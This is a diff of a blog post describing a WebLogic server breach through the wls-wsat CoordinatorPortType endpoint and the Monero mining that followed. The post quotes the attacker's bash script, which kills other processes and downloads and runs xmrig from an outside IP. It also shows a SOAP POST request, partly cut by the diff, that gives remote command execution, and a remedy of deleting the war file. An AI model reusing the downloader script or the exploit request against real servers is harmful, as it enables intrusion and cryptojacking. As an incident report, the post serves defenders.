@@ -6,14 +6,14 @@ While we were working on these jobs, suddenly in one machine all of our java pro
 
 After two hours everything went normally. Then the ultimate catastrophic event happened. Our java instances had been killed again. When we check the processes there were two java processes which eat up the cpu like a hungry pig. We decided not to kill these processes but examine them. When we inspect it with netstat we saw that they send packages to the following IP address.
 
-'''
+```
 http://145.239.0.84/
 Mining Pool Online
-'''
+```
 
 We checked the history and could not believe our eyes.
 
-'''
+```
 #!/bin/bash
 sPid=$$
 mPid=''
@@ -24,7 +24,7 @@ killer() {     for tmpVar in `ps -aeo pid,%cpu,command | sed 1d | sort -k 2 | ta
 runer() {     if [ -z "$mPid" ]; then         if [ ! -f $mName ]; then             downloader http://165.227.215.25/xmrig-y $mName;         fi;         chmod +x ./$mName;         ./$mName;     fi;     mPid=`ps -eo pid,command | grep $mName | head -n 1 | awk '{print $1}'`; }
 pkill python; pkill $mName
 downloader http://165.227.215.25/xmrig-y $mName
-'''
+```
 
 Someone had been killed all of our processes except its process. Downloaded a modified executable named xmrig which was apparently a Monero (XMR) CPU miner. Started this executable and started mining XMR on our servers. The process was named as java and was sending data to the Mining Pool Online (http://145.239.0.84/)
 
@@ -32,7 +32,7 @@ We were shocked. After a couple of hours of blaming and panicking we discovered 
 
 There is a path in WebLogic server wls-wsat/CoordinatorPortType which can be used to execute any kind of soap request. So when I post this request.
 
-'''
+```
 POST your_host/wls-wsat/CoordinatorPortType HTTP 1.1
 
 Host: host_name
@@ -70,7 +70,7 @@ Connection: close
     <soapenv:Body />
 </soapenv:Envelope>
 
-'''
+```
 
 The soap request has been executed. The request mainly creates a ProcessBuilder object and executes it!!!
 So only with a HTTP request, I can execute any command on the remote server!!!
@@ -79,9 +79,9 @@ We were actually happy when we discovered that.
 
 Our solution was to delete the responsible war. You can find it with the following command.
 
-'''
+```
 locate wls-wsat.war
-'''
+```
 
 Just delete it. Do not spend time for patching your useless weblogic server. 
 Weblogic sucks!!!
